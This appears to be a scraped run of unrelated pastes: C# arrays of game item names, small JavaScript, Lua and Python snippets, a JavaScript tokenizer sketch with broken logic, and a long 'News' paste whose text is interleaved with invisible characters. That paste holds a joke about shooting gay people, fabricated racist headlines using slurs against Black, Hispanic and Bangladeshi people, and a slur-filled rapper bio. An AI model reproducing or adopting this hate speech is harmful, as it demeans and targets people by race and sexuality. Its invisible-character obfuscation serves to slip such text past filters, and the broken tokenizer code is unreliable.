            ""Conviction"",  ""Benediction"",   ""Command"",   ""Request"",   ""Demand"", ""Decree"", ""Edict"",
        };

    #endregion

    #region BaseItem Names

    private string[] _baseHeadwearNames = new string[] { ""Hood"", ""Shroud"", ""Helm"", ""Crown"", ""Armet"", ""Cap"" };
    private string[] _baseChestwearNames = new string[] { ""Armor"", ""Tunic"", ""Battlegear"", ""Breastplate"", ""Chestplate"" };
    private string[] _baseHandwearNames = new string[] { ""Gloves"", ""Wraps"", ""Mittens"", ""Handwraps"", ""Gauntlets"", ""Bracers"", ""Armguards"", ""Vambraces"", ""Wristbands"" };
    private string[] _baseFootwearNames = new string[] { ""Boots"", ""Shoes"", ""Greaves"", ""Treads"" };

    private string[] _baseAmuletNames = new string[] { ""Amulet"" };
    private string[] _baseRingNames = new string[] { ""Ring"", ""Loop"" };
    private string[] _baseShieldNames = new string[] { ""Shield"", ""Bulwark"", ""Ward"", ""Tower Shield"", ""Guard"" };
    private string[] _baseTomeNames = new string[] { ""Book"", ""Tome"", ""Grimoire"" };
    private string[] _baseFistNames = new string[] { ""Knuckle"", ""Fist"", ""Claws"", ""Katar"", ""Fascia"", ""Quhab"", ""Talons"", ""Cestus"" };
    private string[] _baseSwordNames = new string[] { ""Sword"", ""Blade"", ""Edge"", ""Falcata"", ""Scimitar"", ""Tulwar"", ""Falchion"", ""Gladius"" };
    private string[] _baseGreatswordNames = new string[] { ""Claymore"", ""Greatsword"", ""Giant Sword"", ""Gothic Sword"", ""Buster Sword"", ""Zweihander"" };
    private string[] _baseAxeNames = new string[] { ""Axe"", ""Hatchet"", ""Cleaver"", ""Crescent"", ""Hand Axe"", ""Broad Axe"", ""War Axe"" };
    private string[] _baseGreataxeNames = new string[] { ""Greataxe"", ""Battleaxe"", ""Champion Axe"", ""Giant Axe"", ""Executioner Axe"" };
    private string[] _baseMaceNames = new string[] { ""Mace"", ""Cudgel"", ""Knout"", ""Club"", ""Scourge"", ""Flail"", ""Morning Star"" };
    private string[] _baseGreatmaceNames = new string[] { ""Maul"", ""Crusher"", ""Great Club"", ""Thunder Maul"", ""Ogre Maul"" };
    private string[] _baseBowNames = new string[] { ""Bow"", ""Ashwood Bow"", ""Cedar Bow"", ""Shadow Bow"", ""Longbow"", ""Shortbow"" };
    private string[] _baseDaggerNames = new string[] { ""Dagger"", ""Kris"", ""Splinter"", ""Shiv"", ""Shank"", ""Heartseeker"" };
    private string[] _baseStaffNames = new string[] { ""Staff"", ""Walking Stick"", ""Cane"", ""Crutch"", ""Limb"" };
    private string[] _baseWandNames = new string[] { ""Wand"", ""Orb"" };

    #endregion BaseItem Names
}"
tPTbFbv9,Towns to JSON,Pijomir,JavaScript,Saturday 20th of January 2024 10:08:48 AM CDT,"function converTownsObjectToJSON(input) {
    let result = [];
    input.shift();
    input.forEach(el => {
        let [town, latitude, longitude] = el.split('|').map(a => a.trim()).filter(Boolean);
        result.push({'Town': town, 'Latitude': parseFloat(Number(latitude).toFixed(2)), 'Longitude': parseFloat(Number(longitude).toFixed(2))});
    });
    return JSON.stringify(result);  
}"
APWJyxUS,startup,maanlamp,Lua,Saturday 20th of January 2024 10:05:23 AM CDT,"local term = require(""term"");
local os = require(""os"");
local URL = require(""core.url"");

term.clear();
term.setCursorPos(1, 1);

os.run(""repl"");"
V9LaRSWw,Python exec example,alaex777,Python,Saturday 20th of January 2024 10:01:08 AM CDT,"# 20.01.24

'''
Exec allows you to execute
python code from string
'''

code = '''
x = 10
y = 20
print(""Sum:"", x + y)
'''

exec(code)  # Sum: 30
"
3HtRdPUV,Untitled,Tkap1,JavaScript,Saturday 20th of January 2024 09:15:19 AM CDT,"

const TOKEN_NUMBER = 0
const TOKEN_IDENTIFIER = 1

function main()
{
	// USAGE
	// USAGE
	// USAGE
	const input = ""hello adrian 123"";
	let tokenizer = {text: input, index: 0};

	const token = get_token(tokenizer); // returns type = identifier, text = ""hello""
	token = get_token(tokenizer); // returns type = identifier, text = ""adrian""
	token = get_token(tokenizer); // returns type = number, text = ""123""

	// If you want to look at the next token but not advance the tokenizer:
	token = get_token({...tokenizer})

	return 0;
}

function get_token(tokenizer)
{
	let token = {type: null, text: null};
	eat_whitespace(tokenizer);
	if(is_number(tokenizer.text[tokenizer.index])) {
		token.type = TOKEN_NUMBER;
		let len = 0;
		while(is_number(tokenizer.text[tokenizer.index])) {
			len += 1;
		}
		token.text = tokenizer.text.substring(tokenizer.index, tokenizer.index + len);
		tokenizer.index += len;
	}
	else if(...) { // logic for an identifier

	}
	else if(...) { // logic for something else

	}
	// ...
	else {
		printf(""We do not understand the input!\n"");
	}
	return token;
}

function eat_whitespace(tokenizer)
{
	while(
		tokenizer.text[tokenizer.index] == ' ' || tokenizer.text[tokenizer.index] == '\n' || tokenizer.text[tokenizer.index] == '\t' ||
		tokenizer.text[tokenizer.index] == '\r'
	) {
		tokenizer.index += 1;
	}
}

function is_number(char)
{
	return char >= '0' && char <= '9';
}"
CQSHKxLP,News Jan20 24,Newscaster_Ned,Email,Saturday 20th of January 2024 08:52:27 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎,‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎.‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎s‎h‎o‎o‎t‎i‎n‎g‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎i‎t‎h‎ ‎m‎y‎ ‎n‎e‎w‎ ‎g‎u‎n‎ ‎t‎h‎a‎t‎ ‎t‎u‎r‎n‎s‎ ‎g‎a‎y‎ ‎p‎e‎o‎p‎l‎e‎ ‎s‎t‎r‎a‎i‎g‎h‎t‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎

‘‎I‎t‎’‎s‎ ‎a‎ ‎G‎r‎e‎a‎t‎ ‎D‎a‎y‎!‎’‎

N‎a‎t‎i‎o‎n‎a‎l‎ ‎C‎h‎a‎m‎p‎i‎o‎n‎ ‎M‎i‎c‎h‎i‎g‎a‎n‎ ‎C‎o‎a‎c‎h‎ ‎J‎i‎m‎ ‎H‎a‎r‎b‎a‎u‎g‎h‎ ‎D‎e‎l‎i‎v‎e‎r‎s‎ ‎S‎p‎e‎e‎c‎h‎ ‎a‎t‎ ‎M‎a‎r‎c‎h‎ ‎f‎o‎r‎ ‎L‎i‎f‎e‎ ‎i‎n‎ ‎D‎.‎C‎.‎
C‎a‎r‎m‎e‎n‎ ‎M‎a‎n‎d‎a‎t‎o‎_‎G‎e‎t‎t‎y‎ ‎I‎m‎a‎g‎e‎s‎ ‎(‎3‎)‎
O‎n‎ ‎t‎h‎e‎ ‎t‎a‎i‎l‎ ‎o‎f‎ ‎w‎i‎n‎n‎i‎n‎g‎ ‎c‎o‎l‎l‎e‎g‎e‎ ‎f‎o‎o‎t‎b‎a‎l‎l‎’‎s‎ ‎n‎a‎t‎i‎o‎n‎a‎l‎ ‎c‎h‎a‎m‎p‎i‎o‎n‎s‎h‎i‎p‎,‎ ‎W‎o‎l‎v‎e‎r‎i‎n‎e‎s‎ ‎c‎o‎a‎c‎h‎ ‎J‎i‎m‎ ‎H‎a‎r‎b‎a‎u‎g‎h‎ ‎s‎t‎o‎p‎p‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎2‎0‎2‎4‎ ‎M‎a‎r‎c‎h‎ ‎f‎o‎r‎ ‎L‎i‎f‎e‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎.‎C‎.‎,‎ ‎F‎r‎i‎d‎a‎y‎ ‎t‎o‎ ‎d‎e‎l‎i‎v‎e‎r‎ ‎a‎ ‎s‎h‎o‎r‎t‎ ‎a‎d‎d‎r‎e‎s‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎t‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎m‎a‎r‎c‎h‎e‎r‎s‎.‎

M‎i‎c‎h‎i‎g‎a‎n‎ ‎C‎o‎a‎c‎h‎ ‎J‎i‎m‎ ‎H‎a‎r‎b‎a‎u‎g‎h‎ ‎D‎e‎l‎i‎v‎e‎r‎s‎ ‎S‎p‎e‎e‎c‎h‎ ‎a‎t‎ ‎M‎a‎r‎c‎h‎ ‎f‎o‎r‎ ‎L‎i‎f‎e‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎
M‎i‎c‎h‎i‎g‎a‎n‎ ‎C‎o‎a‎c‎h‎ ‎J‎i‎m‎ ‎H‎a‎r‎b‎a‎u‎g‎h‎ ‎D‎e‎l‎i‎v‎e‎r‎s‎ ‎S‎p‎e‎e‎c‎h‎ ‎a‎t‎ ‎M‎a‎r‎c‎h‎ ‎f‎o‎r‎ ‎L‎i‎f‎e‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎
1‎,‎2‎0‎4‎
H‎o‎u‎s‎e‎ ‎P‎a‎s‎s‎e‎s‎ ‎P‎e‎l‎o‎s‎i‎-‎S‎c‎h‎u‎m‎e‎r‎ ‎C‎R‎,‎ ‎A‎v‎e‎r‎t‎i‎n‎g‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎F‎e‎a‎r‎s‎ ‎U‎n‎t‎i‎l‎ ‎M‎a‎r‎c‎h‎
6‎,‎4‎0‎8‎
R‎e‎p‎o‎r‎t‎:‎ ‎G‎A‎ ‎J‎u‎d‎g‎e‎ ‎S‎c‎h‎e‎d‎u‎l‎e‎s‎ ‎H‎e‎a‎r‎i‎n‎g‎ ‎o‎n‎ ‎A‎l‎l‎e‎g‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎ ‎M‎i‎s‎c‎o‎n‎d‎u‎c‎t‎
R‎e‎p‎o‎r‎t‎:‎ ‎G‎A‎ ‎J‎u‎d‎g‎e‎ ‎S‎c‎h‎e‎d‎u‎l‎e‎s‎ ‎H‎e‎a‎r‎i‎n‎g‎ ‎o‎n‎ ‎A‎l‎l‎e‎g‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎ ‎M‎i‎s‎c‎o‎n‎d‎u‎c‎t‎
4‎,‎3‎8‎5‎
P‎u‎b‎l‎i‎s‎h‎e‎r‎ ‎o‎f‎ ‎'‎S‎p‎o‎r‎t‎s‎ ‎I‎l‎l‎u‎s‎t‎r‎a‎t‎e‎d‎'‎ ‎L‎a‎y‎s‎ ‎O‎f‎f‎ ‎M‎a‎g‎a‎z‎i‎n‎e‎'‎s‎ ‎E‎n‎t‎i‎r‎e‎ ‎S‎t‎a‎f‎f‎
P‎u‎b‎l‎i‎s‎h‎e‎r‎ ‎o‎f‎ ‎'‎S‎p‎o‎r‎t‎s‎ ‎I‎l‎l‎u‎s‎t‎r‎a‎t‎e‎d‎'‎ ‎L‎a‎y‎s‎ ‎O‎f‎f‎ ‎M‎a‎g‎a‎z‎i‎n‎e‎'‎s‎ ‎E‎n‎t‎i‎r‎e‎ ‎S‎t‎a‎f‎f‎
6‎,‎8‎9‎1‎
K‎i‎n‎z‎i‎n‎g‎e‎r‎:‎r‎e‎t‎t‎y‎ ‎D‎i‎s‎h‎e‎a‎r‎t‎e‎n‎i‎n‎g‎'‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎S‎h‎o‎w‎i‎n‎g‎ ‎M‎o‎m‎e‎n‎t‎u‎m‎
K‎i‎n‎z‎i‎n‎g‎e‎r‎:‎r‎e‎t‎t‎y‎ ‎D‎i‎s‎h‎e‎a‎r‎t‎e‎n‎i‎n‎g‎'‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎S‎h‎o‎w‎i‎n‎g‎ ‎M‎o‎m‎e‎n‎t‎u‎m‎
3‎7‎9‎
P‎a‎m‎p‎e‎r‎e‎d‎ ‎D‎a‎v‎o‎s‎ ‎E‎l‎i‎t‎e‎s‎ ‎T‎r‎e‎a‎t‎e‎d‎ ‎t‎o‎ ‎B‎a‎l‎l‎e‎t‎ ‎D‎a‎n‎c‎e‎r‎s‎,‎ ‎C‎e‎l‎l‎i‎s‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎S‎n‎o‎w‎
P‎a‎m‎p‎e‎r‎e‎d‎ ‎D‎a‎v‎o‎s‎ ‎E‎l‎i‎t‎e‎s‎ ‎T‎r‎e‎a‎t‎e‎d‎ ‎t‎o‎ ‎B‎a‎l‎l‎e‎t‎ ‎D‎a‎n‎c‎e‎r‎s‎,‎ ‎C‎e‎l‎l‎i‎s‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎S‎n‎o‎w‎
3‎,‎3‎4‎1‎
M‎S‎N‎B‎C‎'‎s‎ ‎R‎e‎i‎d‎:‎ ‎M‎o‎m‎s‎ ‎f‎o‎r‎ ‎L‎i‎b‎e‎r‎t‎y‎ ‎I‎s‎ ‎M‎o‎d‎e‎r‎n‎ ‎D‎a‎y‎ ‎D‎a‎u‎g‎h‎t‎e‎r‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎C‎o‎n‎f‎e‎d‎e‎r‎a‎c‎y‎
M‎S‎N‎B‎C‎'‎s‎ ‎R‎e‎i‎d‎:‎ ‎M‎o‎m‎s‎ ‎f‎o‎r‎ ‎L‎i‎b‎e‎r‎t‎y‎ ‎I‎s‎ ‎M‎o‎d‎e‎r‎n‎ ‎D‎a‎y‎ ‎D‎a‎u‎g‎h‎t‎e‎r‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎C‎o‎n‎f‎e‎d‎e‎r‎a‎c‎y‎
4‎0‎1‎
A‎l‎e‎c‎ ‎B‎a‎l‎d‎w‎i‎n‎ ‎i‎n‎d‎i‎c‎t‎e‎d‎ ‎o‎n‎ ‎i‎n‎v‎o‎l‎u‎n‎t‎a‎r‎y‎ ‎M‎a‎n‎s‎l‎a‎u‎g‎h‎t‎e‎r‎ ‎C‎h‎a‎r‎g‎e‎ ‎i‎n‎ ‎'‎R‎u‎s‎t‎'‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎
A‎l‎e‎c‎ ‎B‎a‎l‎d‎w‎i‎n‎ ‎i‎n‎d‎i‎c‎t‎e‎d‎ ‎o‎n‎ ‎i‎n‎v‎o‎l‎u‎n‎t‎a‎r‎y‎ ‎M‎a‎n‎s‎l‎a‎u‎g‎h‎t‎e‎r‎ ‎C‎h‎a‎r‎g‎e‎ ‎i‎n‎ ‎'‎R‎u‎s‎t‎'‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎
1‎,‎7‎0‎8‎
P‎o‎l‎l‎:‎ ‎M‎o‎s‎t‎ ‎M‎A‎G‎A‎ ‎V‎o‎t‎e‎r‎s‎ ‎S‎a‎y‎ ‎T‎r‎u‎m‎p‎ ‎S‎h‎o‎u‎l‎d‎ ‎S‎e‎e‎k‎ ‎R‎e‎v‎e‎n‎g‎e‎ ‎i‎n‎ ‎S‎e‎c‎o‎n‎d‎ ‎T‎e‎r‎m‎
1‎,‎9‎0‎5‎
G‎e‎r‎m‎a‎n‎ ‎D‎e‎f‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎:‎ ‎R‎u‎s‎s‎i‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎N‎A‎T‎O‎ ‎N‎o‎t‎ ‎L‎i‎k‎e‎l‎y‎
G‎e‎r‎m‎a‎n‎ ‎D‎e‎f‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎:‎ ‎R‎u‎s‎s‎i‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎N‎A‎T‎O‎ ‎N‎o‎t‎ ‎L‎i‎k‎e‎l‎y‎

C‎o‎l‎u‎m‎b‎i‎a‎:‎ ‎M‎o‎n‎k‎u‎s‎ ‎H‎o‎l‎d‎s‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎e‎n‎ ‎a‎t‎ ‎G‎u‎n‎p‎o‎i‎n‎t‎ ‎a‎n‎d‎ ‎R‎a‎p‎e‎s‎ ‎o‎n‎e‎ ‎o‎f‎ ‎T‎h‎e‎m‎.‎

N‎e‎g‎r‎o‎e‎s‎ ‎a‎r‎e‎ ‎k‎n‎o‎w‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎s‎e‎x‎u‎a‎l‎ ‎p‎r‎o‎w‎e‎s‎s‎.‎


A‎l‎a‎b‎a‎m‎a‎:‎ ‎N‎e‎g‎r‎o‎ ‎P‎l‎a‎y‎s‎ ‎V‎i‎d‎e‎o‎ ‎G‎a‎m‎e‎s‎ ‎W‎h‎i‎l‎e‎ ‎H‎i‎s‎ ‎N‎i‎g‎l‎e‎t‎ ‎D‎r‎o‎w‎n‎s‎ ‎i‎n‎ ‎H‎i‎s‎ ‎B‎a‎t‎h‎t‎u‎b‎.‎


N‎i‎g‎g‎a‎b‎i‎t‎c‎h‎ ‎W‎h‎o‎ ‎R‎o‎b‎b‎e‎d‎ ‎C‎o‎n‎v‎e‎n‎i‎e‎n‎c‎e‎ ‎S‎t‎o‎ ‎G‎e‎t‎s‎ ‎P‎r‎i‎s‎o‎n‎ ‎T‎i‎m‎e‎ ‎A‎f‎t‎e‎r‎ ‎H‎i‎d‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎C‎o‎p‎s‎ ‎i‎n‎ ‎D‎r‎a‎i‎n‎a‎g‎e‎ ‎P‎i‎p‎e‎.‎


C‎h‎i‎c‎a‎g‎o‎:‎ ‎2‎ ‎S‎h‎e‎b‎o‎o‎n‎s‎ ‎R‎o‎b‎ ‎R‎e‎t‎i‎r‎e‎m‎e‎n‎t‎ ‎H‎o‎m‎e‎.‎


S‎p‎i‎c‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎L‎A‎ ‎B‎e‎a‎t‎i‎n‎g‎s‎ ‎o‎f‎ ‎H‎o‎m‎e‎l‎e‎s‎s‎ ‎P‎e‎o‎p‎l‎e‎.‎


S‎p‎i‎c‎ ‎B‎o‎x‎e‎r‎ ‎V‎i‎c‎t‎o‎r‎ ‎O‎r‎t‎i‎z‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎p‎i‎n‎g‎ ‎W‎o‎m‎a‎n‎.‎


N‎e‎w‎ ‎J‎e‎r‎s‎e‎y‎:‎ ‎S‎p‎i‎c‎ ‎""‎D‎e‎n‎t‎i‎s‎t‎""‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎P‎u‎t‎t‎i‎n‎g‎ ‎B‎r‎a‎c‎e‎s‎ ‎o‎n‎ ‎T‎e‎e‎n‎a‎g‎e‎ ‎G‎i‎r‎l‎.‎


6‎5‎0‎ ‎B‎a‎n‎g‎l‎a‎d‎e‎s‎h‎i‎ ‎S‎a‎n‎d‎ ‎N‎i‎g‎g‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎a‎t‎ ‎T‎e‎x‎a‎s‎ ‎B‎o‎r‎d‎e‎r‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎M‎a‎y‎b‎e‎ ‎t‎h‎e‎ ‎w‎e‎a‎t‎h‎e‎r‎ ‎w‎i‎l‎l‎ ‎m‎a‎k‎e‎ ‎y‎o‎u‎ ‎s‎m‎i‎l‎e‎.‎ ‎I‎f‎ ‎n‎o‎t‎,‎ ‎I‎'‎l‎l‎ ‎j‎u‎s‎t‎ ‎d‎o‎ ‎m‎y‎ ‎o‎r‎a‎n‎g‎e‎ ‎p‎e‎e‎l‎ ‎t‎h‎i‎n‎g‎.‎

T‎o‎d‎a‎y‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
4‎6‎°‎
/‎3‎5‎°‎
0‎%‎
N‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎0‎ ‎|‎ ‎D‎a‎y‎
4‎6‎°‎
N‎E‎
1‎4‎
 ‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎s‎u‎n‎n‎y‎.‎ ‎H‎i‎g‎h‎ ‎4‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
3‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
4‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎2‎6‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
5‎:‎5‎6‎ ‎p‎m‎
S‎a‎t‎ ‎2‎0‎ ‎|‎ ‎N‎i‎g‎h‎t‎
3‎5‎°‎
2‎%‎
E‎N‎E‎
6‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎L‎o‎w‎ ‎a‎r‎o‎u‎n‎d‎ ‎3‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎E‎N‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
4‎8‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎:‎3‎3‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
3‎:‎0‎5‎ ‎a‎m‎
S‎u‎n‎ ‎2‎1‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
4‎1‎°‎
/‎3‎8‎°‎
4‎1‎%‎
E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎2‎
T‎h‎u‎n‎d‎e‎r‎s‎h‎o‎w‎e‎r‎s‎
6‎2‎°‎
/‎5‎5‎°‎
9‎1‎%‎
S‎ ‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎3‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎5‎7‎°‎
9‎1‎%‎
S‎S‎E‎ ‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎4‎
R‎a‎i‎n‎
6‎9‎°‎
/‎4‎9‎°‎
7‎6‎%‎
N‎N‎W‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎4‎6‎°‎
1‎7‎%‎
N‎N‎W‎ ‎8‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎5‎°‎
2‎4‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎2‎°‎
/‎3‎9‎°‎
2‎3‎%‎
N‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
5‎6‎°‎
/‎3‎5‎°‎
9‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎1‎°‎
/‎3‎9‎°‎
1‎0‎%‎
N‎W‎ ‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎3‎°‎
/‎4‎1‎°‎
4‎%‎
N‎W‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎3‎°‎
/‎4‎7‎°‎
1‎9‎%‎
S‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎4‎9‎°‎
2‎4‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎2‎
S‎h‎o‎w‎e‎r‎s‎
6‎9‎°‎
/‎4‎8‎°‎
5‎1‎%‎
S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎3‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
6‎8‎°‎
/‎4‎7‎°‎
4‎9‎%‎
W‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎G‎h‎e‎t‎t‎o‎ ‎L‎o‎b‎s‎t‎e‎r‎s‎.‎ ‎🦞

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

V‎i‎p‎e‎r‎
V‎i‎p‎e‎r‎ ‎(‎L‎e‎e‎ ‎A‎.‎ ‎C‎a‎r‎t‎e‎r‎)‎,‎ ‎V‎i‎p‎e‎r‎ ‎T‎h‎e‎ ‎R‎a‎p‎p‎e‎r‎,‎ ‎o‎r‎ ‎R‎a‎p‎p‎e‎r‎ ‎V‎i‎p‎e‎r‎,‎ ‎i‎s‎ ‎t‎h‎e‎ ‎d‎e‎f‎i‎n‎i‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎w‎o‎r‎k‎ ‎d‎o‎n‎e‎ ‎a‎t‎ ‎a‎ ‎f‎a‎s‎t‎ ‎p‎a‎c‎e‎,‎ ‎a‎n‎d‎ ‎b‎e‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎a‎t‎ ‎g‎r‎i‎n‎d‎,‎ ‎u‎ ‎k‎n‎o‎ ‎w‎a‎t‎ ‎i‎'‎m‎ ‎s‎a‎y‎i‎n‎e‎ ‎m‎a‎y‎n‎e‎?‎

A‎ ‎r‎a‎p‎p‎e‎r‎ ‎c‎o‎m‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎c‎h‎o‎p‎p‎e‎d‎ ‎a‎n‎d‎ ‎s‎c‎r‎e‎w‎e‎d‎ ‎s‎c‎e‎n‎e‎ ‎i‎n‎ ‎H‎o‎u‎s‎t‎o‎n‎,‎ ‎T‎e‎x‎a‎s‎,‎ ‎V‎i‎p‎e‎r‎ ‎h‎a‎s‎ ‎d‎r‎a‎w‎n‎ ‎s‎i‎m‎i‎l‎a‎r‎i‎t‎i‎e‎s‎ ‎t‎o‎ ‎f‎e‎l‎l‎o‎w‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎L‎i‎l‎ ‎B‎ ‎a‎n‎d‎ ‎S‎o‎u‎l‎j‎a‎ ‎B‎o‎y‎ ‎f‎o‎r‎ ‎h‎i‎s‎ ‎u‎n‎i‎q‎u‎e‎ ‎s‎t‎y‎l‎e‎ ‎o‎f‎ ‎""‎o‎u‎t‎s‎i‎d‎e‎r‎""‎ ‎m‎u‎s‎i‎c‎,‎ ‎h‎i‎s‎ ‎l‎o‎w‎-‎b‎u‎d‎g‎e‎t‎ ‎m‎u‎s‎i‎c‎ ‎v‎i‎d‎e‎o‎s‎ ‎c‎o‎n‎t‎a‎i‎n‎i‎n‎g‎ ‎c‎h‎e‎a‎p‎ ‎p‎r‎o‎s‎t‎i‎t‎u‎t‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎f‎a‎c‎t‎ ‎t‎h‎a‎t‎ ‎h‎i‎s‎ ‎d‎i‎s‎c‎o‎g‎r‎a‎p‎h‎y‎ ‎i‎s‎ ‎s‎o‎ ‎l‎a‎r‎g‎e‎ ‎t‎h‎a‎t‎ ‎n‎o‎b‎o‎d‎y‎ 